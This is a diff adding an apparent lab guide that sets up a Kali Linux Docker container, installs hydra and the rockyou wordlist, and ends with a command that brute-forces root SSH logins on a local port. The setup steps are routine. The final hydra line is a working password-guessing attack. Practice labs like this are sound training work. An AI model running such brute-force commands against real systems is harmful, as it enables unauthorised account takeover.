@@ -1,0 +1,42 @@
+sudo pacman -S docker
+sudo systemctl start docker
+sudo systemctl enable docker
+```
+##  Run Attacker (Kali Linux in Docker)
+
+```bash
+docker run -it --rm kalilinux/kali-rolling /bin/bash
+
+Explanation:
+docker run – Runs a Docker container.
+-it – Interactive terminal (you get a shell).
+--rm – Remove the container when you exit (no leftover files).
+kalilinux/kali-rolling – Official Kali Linux Docker image.
+/bin/bash – Starts a Bash shell inside Kali.
+
+If the Image has networking and repository issues then Update DNS and APT Sources
+
+- Inside the kali docker run these commands
+
+1. echo "nameserver 8.8.8.8" > /etc/resolv.conf
+echo "nameserver 8.8.4.4" >> /etc/resolv.conf
+
+2. echo "deb http://kali.download/kali kali-rolling main non-free contrib" > /etc/apt/sources.list
+
+# Install hydra for bruteforcing
+
+ apt update && apt install hydra -y
+
+# Install worldlist
+
+ apt install wordlists -y
+
+# unzip the rockyou.txt
+
+gunzip /usr/share/wordlists/rockyou.txt
+
+# Attack the victim ssh
+
+hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1:2222
+
+
